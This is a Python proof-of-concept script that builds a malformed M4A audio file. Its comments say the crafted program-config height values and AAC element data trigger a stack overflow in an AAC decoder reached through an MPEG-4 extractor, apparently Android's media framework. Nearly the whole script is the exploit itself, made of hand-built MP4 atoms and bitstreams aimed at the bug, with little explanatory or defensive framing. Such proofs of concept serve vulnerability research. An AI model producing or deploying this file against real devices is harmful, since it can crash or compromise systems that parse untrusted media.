# coding=utf-8
import ipdb
from pwn import *
context.endian = "big"

def p24(n):
    return chr(0) + p16(n)

def gen_ftyp():
    '''
    generate ftype chunk
    chunk_data_size must >= 8
    numCompatibleBrands = datasize-8 / 4 , num could be zero.
    '''
    data = ""
    major_brand = "m4a "
    major_brand_version = p32(0)
    compatible_brands = ["mp42"] # could be a list

    data += major_brand
    data += major_brand_version
    data += "".join(x for x in compatible_brands)

    return data

def gen_mdat():

    # ID_CPE is not simple either
    element_type = to_bin_str(0,3) # ID_SCE
    '''
    static const rbd_id_t el_aac_sce[] = {
        adtscrc_start_reg1,    // 29
        element_instance_tag,  // 0
        global_gain,    //2 
        ics_info,  //3 
        section_data, //8
        scale_factor_data,
        pulse,
        tns_data_present,
        tns_data,
        gain_control_data_present,
        /* gain_control_data, */
        spectral_data,
        adtscrc_end_reg1,
        end_of_sequence
    };
    '''
    # adtscrc_start_reg1 
    # do nothing
    # element_instance_tag
    element_instance_tag = to_bin_str(1,4)
    # global_gain
    global_gain = to_bin_str(1,8)
    # ics info : individual channel info
    unused_1 = to_bin_str(0,1)
    window_sequence = to_bin_str(0,2)
    window_shap = to_bin_str(1,1)
    max_sf_bands = to_bin_str(1,6)
    predictor_data_present = to_bin_str(0,1) # this must be 0
    # after I modified this data , the vulnerability triggered.
    # so I stopped configuring

    raw_data = element_type + element_instance_tag + global_gain
    raw_data += unused_1 + window_sequence + window_shap
    raw_data += max_sf_bands + predictor_data_present
 
    # # no , ID_DSE can not trigger the vulnerability
    # # only ID_LFE , ID_SCE, ID_CPE can do it
    # element_type = to_bin_str(1,3 ) # ID_CPE
    # # number of channels is 2
    # # el_aac_cpe will be much simpler
    # '''
    # static const rbd_id_t el_aac_cpe[] = {
    #     adtscrc_start_reg1,  // 29 // do nothing
    #     element_instance_tag,  // 0
    #     common_window,  //1 
    #     link_sequence  //37
    # };
    # '''
    # element_instance_tag = to_bin_str(0,4)
    # common_window_decision_bit = to_bin_str(0,1)

        
    # raw_data = element_type

    ############################ failed implementation
    # element_type = to_bin_str(4,3) # ID_DSE, easier to construct
    # # enter CDataStreamElement_Read
    # element_instance_tag = to_bin_str(1,4)
    # data_byte_align_flag = to_bin_str(0,1) # no need to align
    # count = to_bin_str(1,8) 

    # # EscCount
    # # if count == 255 , count += readbits(8)
    # # dseBits = count * 8

    # # enter CAacDecoder_AncDataParse
    # # count is ancBytes
    # # read ancData->buffer in this function
    # raw_data = element_type + element_instance_tag 
    # raw_data += data_byte_align_flag + count
    # for i in range( int(count,2) ):
    #     buffer = to_bin_str(0xbc,8)
    #     raw_data += buffer

    # # enter aacDecoder_drcMarkPayload
    # # type is DVB_DRC_ANC_DATA
    # sync_byte = to_bin_str(0xbc,8)
    # bs_info_field = to_bin_str(0,8) # pass,mpeg_audio_type,dolby_surround_mode
    # reserved_1 = to_bin_str(0,3)
    # dmx_levels_present = to_bin_str(0,1)
    # reserved_2 = to_bin_str(0,1) 
    # compression_present = to_bin_str(0,1)
    # coarse_grain_tc_present = to_bin_str(0,1)
    # fine_grain_tc_present = to_bin_str(0,1)
    # # todo , set all present flag to zero to avoid other data

    # # enter pcmDmx_Parse
    # # not mpeg2
    # sync_byte = to_bin_str(0xbc,8)
    # pseudoSurround = to_bin_str(0,1)
    # dmxLvlAvail = to_bin_str(0,1)
    # extDataAvail = to_bin_str(0,1)
    
    # raw_data += sync_byte
    # raw_data += bs_info_field
    # raw_data += reserved_1
    # raw_data += dmx_levels_present
    # raw_data += reserved_2
    # raw_data += compression_present
    # raw_data += coarse_grain_tc_present
    # raw_data += fine_grain_tc_present
    # raw_data += sync_byte
    # raw_data += pseudoSurround
    # raw_data += dmxLvlAvail
    # raw_data += extDataAvail

    # final align
    if len(raw_data) % 8 != 0:
        raw_data = raw_data.ljust( (len(raw_data)+8)/8*8, "0" )
    data = ""
    avail_bits = len(raw_data)
    index = 0
    while avail_bits > 0 :
        # print raw_data[index:index+8]
        data += chr( int(raw_data[index:index+8], 2 ) )
        index += 8
        avail_bits -= 8
        
    data += "A"*100
    return data

def gen_mvhd():
    '''
    mvhd depth must be 1
    data_size >=32
    '''
    version = chr(0) # if version is 0, date is 32bit, if 1, 64 bit
    flags = p24(0) # flags

    created_mac_utc_date = p32(0xaaaaaaaa) # offset is 4
    modified_mac_utc_date = p32(0xbbbbbbbb) # offset is 8

    time_scale = p32(0) # offset is 12 , mHeaderTimescale
    duration = p32(0) # offset is 16 , if dr = -1 , dr = 0. what is it is -2

    # there is other data, but MPEG4Extractor don't care
    play_backspeed = p32(1) # offset = 20
    user_volume = p16(0) # offset = 24
    reserved = p16(0) # offset = 26

    wgma = p16(0) # offset = 28
    wgmb = p16(0) # offset = 30
    wgmu = p16(0) # offset = 32
    wgmc = p16(0) # offset = 32
    wgmd = p16(0) # offset = 34
    wgmv = p16(0)
    wgmx = p16(0)
    wgmy = p16(0)
    wgmw = p16(0)

    data = ""
    data += version
    data += flags
    data += created_mac_utc_date
    data += modified_mac_utc_date
    data += time_scale
    data += duration
    data += play_backspeed
    data += user_volume
    data += reserved
    data += wgma
    data += wgmb
    data += wgmu
    data += wgmc
    data += wgmd
    data += wgmv
    data += wgmx
    data += wgmy
    data += wgmw

    ### ...

    return data

def gen_tkhd():
    '''
    parseTrackHeader
    size can not <4
    size is 96 or 84 , diff=12
    '''
    version = chr(0) # if version is 0, date is 32bit, if 1, 64 bit
    # if version is 0, dynSize = 24, if version==1, dynSize=36
    reserved_1 = p24(0) # flags

    created_mac_utc_date = p32(0xaaaaaaaa) # offset is 4
    modified_mac_utc_date = p32(0xbbbbbbbb) # offset is 8

    track_id = p32(0) # offset is 12 , track_id
    reserved_2 = p32(0) # offset is 16
    duration = p32(0) # offset is 20 , duration
    reserved_3 = p32(0) # offset is 24
    # start of dyn, not processed in MPEG4Extractor
    video_layer = p16(0) # offset == 28
    quicktime_alt = p16(0) # offset == 30
    audio_volume = p16(0) # offset == 32
    reserved_4 = p16(0) # offset == 34

    vgm_va = p32(0) # offset == 36 # this not match

    kFixedOne = 0x10000 # caluculate rotationdegrees with matrix
    # matrixOffset, offset = dynSize + 16 = 24 + 16 = 40
    vgm_vb = p32(0) # offset == 40, a00
    vgm_vu = p32(0) # offset == 44, a01
    vgm_vc = p32(0) # offset == 48
    vgm_vd = p32(0) # offset == 52, a10
    vgm_vv = p32(0) # offset == 56, a11
    vgm_vx = p32(0) # offset == 60
    vgm_vy = p32(0) # offset == 64
    vgm_vw = p32(0) # offset == 68

    video_framesize = p32(0) # offset = 72
    width = p32(100) # offset = 76, dyn + 52
    height = p32(100) # offset = 80, dyn + 56

    data = ""
    data += version
    data += reserved_1
    data += created_mac_utc_date
    data += modified_mac_utc_date
    data += track_id
    data += reserved_2
    data += duration
    data += reserved_3
    data += video_layer
    data += quicktime_alt
    data += audio_volume
    data += reserved_4
    data += vgm_va
    data += vgm_vb
    data += vgm_vu
    data += vgm_vc
    data += vgm_vd
    data += vgm_vv
    data += vgm_vx
    data += vgm_vy
    data += vgm_vw
    data += video_framesize
    data += width
    data += height

    return data

def gen_mdhd():
    version = chr(0)
    reserved_1 = p24(0) # flags

    created_mac_utc_date = p32(0xaaaaaaaa) # offset is 4
    modified_mac_utc_date = p32(0xbbbbbbbb) # offset is 8

    sample_rate = p32(1) # timescale_offset = 12, timescale should not be zero
    track_length = p32(0) # duration

    language = p32(0x12345678)

    data = ""
    data += version
    data += reserved_1
    data += created_mac_utc_date
    data += modified_mac_utc_date
    data += sample_rate
    data += track_length
    data += language

    return data

def gen_hdlr():
    # @todo
    data = ""
    return data

def to_bin_str(value , size=1):
    return bin(value)[2:].rjust(size,'0')

def gen_esds():
    '''
    very important to ASC
    max buffer size is 256
    '''
    version = chr(0)
    reserved_1 = p24(0) # flags

    # Elementary Stream Descriptior
    # defined in the MPEG-4 specification ISO/IEC 14496-1 and subject to the restrictions for storage in MPEG-4 files specified in ISO/IEC 14496-14.
    
    tag = chr(0x3)  # kTag_ESDescriptor
    data_size = chr(32)  # this size must be smaller than esds itself
    es_id = p16(0)
    flags = chr(0) # 8421 => streamDependenceFlag , URL_Flag, OCRStreamFlag

    sub_tag = chr(0x4) # kTag_DecoderConfigDescriptor
    sub_data_size = chr(27) # this size must be smaller than ESDescriptor
    object_type_indication = chr(0x0) # 0xe1=QCELP, 0x6b=MP3
    padding = p32(0)
    bit_rate_max = p32( 1 )
    bit_rate_avg = p32( 1 )

    sub_sub_tag = chr(0x5)
    sub_sub_data_size = chr(12)  # this size must be smaller than ConfigScriptor

    # AOT=2 is AOT_AAC_LC
    obj_type = to_bin_str(2,5)      # aot_type , entered aacDecoder_ConfigRaw
    freqIndex = to_bin_str(12,4)    # freqIndex should not be 13 or 14, this will die

    # when will I modify raw_data?
    # 1. before if-else
    # 2. at the end of each branch
    raw_data = obj_type + freqIndex
    if int(freqIndex,2) == 15:
        sample_rate = to_bin_str(1,24)
        num_channels = to_bin_str(0,4) # m_channelConfiguration

        raw_data += sample_rate
        raw_data += num_channels
    else: 
        # dont have to assign sample rate
        # it will be get from a table according to freq Index
        num_channels = to_bin_str(value=0, size=4)
        raw_data += num_channels
        
    # because aot is neither AOT_SBR nor AOT_PS
    # enter GaSpecificConfig_Parse
    frameLengthFlag = "1"
    dependsOnCoreCoder = "0"
    if int(dependsOnCoreCoder,2) == 1 : 
        pass
        # read another 14 bits
        # coreCoderDelay = read 14 bits    
        # @todo not implemented now
    extension_flag = to_bin_str(0,1)

    raw_data += frameLengthFlag + dependsOnCoreCoder + extension_flag
    if int(num_channels,2) == 0 :
        # enter CProgramConfig_Read function
        element_instance_tag = to_bin_str(value=0, size=4)
        profile = to_bin_str(value=0, size=2)
        sampling_freq_index = to_bin_str(6, 4) # this could not be zero , init will fail
        
        # this three number should not be zero, to trigger the vulnerability
        num_front_channel_ele = to_bin_str(1, 4)
        num_side_channel_ele = to_bin_str(0, 4)
        num_back_channel_ele = to_bin_str(0, 4)
        
        num_lfe_channel_ele = to_bin_str(0,2)
        num_assoc_data_ele = to_bin_str(0,3)
        num_valic_cc_ele = to_bin_str(0,4)

        mono_mix_down_present = "0"
        # todo , if not zero , program will read mono_mix_down_element_number

        stereo_mix_down_present = "0"
        # todo , if not zero , program will read stereo_mix_down_element_number

        matrix_mix_down_index_present = "0"
        # todo , if not zero , program will read matrix_mix_down_index and pseudo_surround_enable

        # read front channel elements info
        raw_data += element_instance_tag + profile + sampling_freq_index
        raw_data += num_front_channel_ele + num_side_channel_ele + num_back_channel_ele
        raw_data += num_lfe_channel_ele + num_assoc_data_ele + num_valic_cc_ele
        raw_data += mono_mix_down_present + stereo_mix_down_present + matrix_mix_down_index_present
        for i in range( int( num_front_channel_ele , 2)) :
            # if is cpe , num_channels += 2 , else , += 1
            front_ele_is_cpe_i = to_bin_str(1,1)
            front_ele_tag_select_i = to_bin_str(1,4)
            
            raw_data += front_ele_is_cpe_i + front_ele_tag_select_i
        
        # todo : 
        # I simple ignored side , back, Lfe, assoc data , valic cc elements for brief
        
        # byte align, update raw_data , the first align
        if len(raw_data) % 8 != 0:
            raw_data = raw_data.ljust( (len(raw_data)+8)/8*8, "0" )

        comment_field_bytes = to_bin_str(3, 8)

        # entering CProgramConfig_ReadHeightExt
        # @param bytesAvailable is comment_field_bytes
        # if startAnchor >= 24 and *bytesAvailable >= 3, read channel element height info, else , not 
        pc_height_ext_sync = to_bin_str(0xac, 8) # fixed value

        raw_data += comment_field_bytes + pc_height_ext_sync
        for i in range( int(num_front_channel_ele,2)) :
            front_element_height_info_i = to_bin_str(3,2)
            raw_data += front_element_height_info_i
            # assign height info i to 3, trigger the stack overflow vulnerability
        # todo I ignored side , back element height info for brief

        # byte align
        if len(raw_data) % 8 != 0:
            raw_data = raw_data.ljust( (len(raw_data)+8)/8*8, "0" )

        # calculate crc and verify crc
        crc = to_bin_str(0x7d, 8)
        raw_data += crc

        # end of CProgramConfig_ReadHeightExt
        # calculate bytes available , this could be negative?
        # todo: read text, but currently I don't know how many comments are there.

        # end of CprogramConfig_Read
        # todo if aot is AOT_AAC_SCAL AOT_ER_AAC_SCAL， read m_layer, but I am not
        # @todo , if extension flag: read numOfSubFrame and layerLength
        # end of mextensionFlag
    else:
        pass
        # @todo

    
    epConfig = to_bin_str(0,2)
    # epConfig shoud <=1 , or return transportdec_unsupported_format
    # if fExplicitBackwardCompatible : parse extension. this flag is always true:
    # entering AudioSpecificConfig_ExtensionParse
    # if program end, this can be ignored and return success directly
    # @todo
    raw_data += epConfig

    # finale align
    if len(raw_data) % 8 != 0:
        raw_data = raw_data.ljust( (len(raw_data)+8)/8*8, "0" )
    
    data = ""
    data += version
    data += reserved_1
    data += tag
    data += data_size
    data += es_id
    data += flags
    data += sub_tag
    data += sub_data_size
    data += object_type_indication
    data += padding
    data += bit_rate_max
    data += bit_rate_avg
    data += sub_sub_tag
    data += sub_sub_data_size

    avail_bits = len(raw_data)
    index = 0

    while avail_bits > 0 :
        # print raw_data[index:index+8]
        data += chr( int(raw_data[index:index+8], 2 ) )
        index += 8
        avail_bits -= 8

    # data += "A"*15 # padding data
    return data

def gen_mp4a():

    reserved = p24(0) + p24(0)
    ref_index = p16(1)
    quicktime_version = p16(0)
    qt_revision_level = p16(0)
    qt_audio_encoding_vendor = p32(0)
    
    num_channels = p16(100)
    sample_size = p16(1) # bits per sample
    qt_comporession_id = p16(1)
    audio_packet_size = p16(0)
    sample_rate = p32(1)

    esds_data = gen_esds()

    data = ""
    data += reserved
    data += ref_index
    data += quicktime_version
    data += qt_revision_level
    data += qt_audio_encoding_vendor
    data += num_channels
    data += sample_size
    data += qt_comporession_id
    data += audio_packet_size
    data += sample_rate
    data += make_chunk("esds",esds_data)
    return data

def gen_minf():

    stbl_data = gen_stbl()

    data = ""
    data += make_chunk('stbl',stbl_data)
    return data

def gen_stsd():

    version = chr(0)
    flags = p24(0)

    number_of_descriptions = p32(1) # just one description atom, mp4a    

    data = ""
    data += version
    data += flags
    data += number_of_descriptions
    data += make_chunk('mp4a', gen_mp4a())

    return data


def gen_stts():
    version = chr(0)
    flags = p24(0)

    number_of_times = p32(1)
    frame_count1 = p32(1)
    duration1 = p32(1)
    # todo there is many , but I just write one

    data = ""
    data += version
    data += flags
    data += number_of_times
    data += frame_count1
    data += duration1
    return data

def gen_stsc():
    version = chr(0)
    flags = p24(0)

    number_of_blocks = p32(1)
    first_chunk1 = p32(1)
    samples_per_chunk = p32(1)
    sample_duration_index = p32(1)
    # todo there is many , but I just write one

    data = ""
    data += version
    data += flags
    data += number_of_blocks
    data += first_chunk1            # startChunk
    data += samples_per_chunk       # samplesPerChunk
    data += sample_duration_index   # chunkDesc

    return data
def gen_stsz():
    
    version = chr(0)
    flags = p24(0)

    default_sample_size = p32(0)  # this did not match the document
    number_of_block_size = p32(1)
    block_size = p32( len(gen_mdat()) )
    # todo there is many , but I just write one 
    # this block is important, block_size is the size of mdat 

    data = ""
    data += version
    data += flags
    data += default_sample_size
    data += number_of_block_size
    data += block_size
    return data


def gen_stco():
    version = chr(0)
    flags = p24(0)

    number_of_offsets = p32(1)
    offset1 = p32(0x1b8)  # offset must be the offset of mdat chunk
    # todo there is many , but I just write one

    data = ""
    data += version
    data += flags
    data += number_of_offsets
    data += offset1

    return data

def gen_stbl():
    stsd_data = gen_stsd()
    
    data = ""
    data += make_chunk('stsd',stsd_data)
    data += make_chunk('stts',gen_stts())
    data += make_chunk('stsc',gen_stsc())
    data += make_chunk('stsz',gen_stsz())
    data += make_chunk('stco',gen_stco())
    return data

def gen_mdia():
    '''
    mdia = mdhd + other
    '''

    mdhd_data = gen_mdhd()
    hdlr_data = gen_hdlr()
    minf_data = gen_minf()

    data = ""
    data += make_chunk('mdhd',mdhd_data)
    # data += make_chunk('hdlr',hdlr_data)
    data += make_chunk('minf',minf_data)
    return data

def gen_trak():
    '''
    generate track data
    depth must be 1, in the moov chunk
    '''
    tkhd_data = gen_tkhd()
    mdia_data = gen_mdia()

    data = ""
    data += make_chunk('tkhd', tkhd_data)
    data += make_chunk('mdia', mdia_data)
    return data

def gen_moov():
    '''
    generate moov chunk data
    '''

    mvhd_data = gen_mvhd()
    trak_data = gen_trak()

    data = ""
    data += make_chunk('mvhd', mvhd_data)
    data += make_chunk('trak', trak_data)
    return data

def make_chunk(type, data):
    return p32(len(data) + 8) + type + data

def main():
    ftyp_data = gen_ftyp()
    moov_data = gen_moov()
    mdat_data = gen_mdat()

    data = ""
    data += make_chunk('ftyp', ftyp_data)
    data += make_chunk('moov', moov_data)
    data += make_chunk('mdat', mdat_data)

    with open("output.m4a","wb") as fout:
        fout.write(data)

if __name__ == "__main__":
    main()

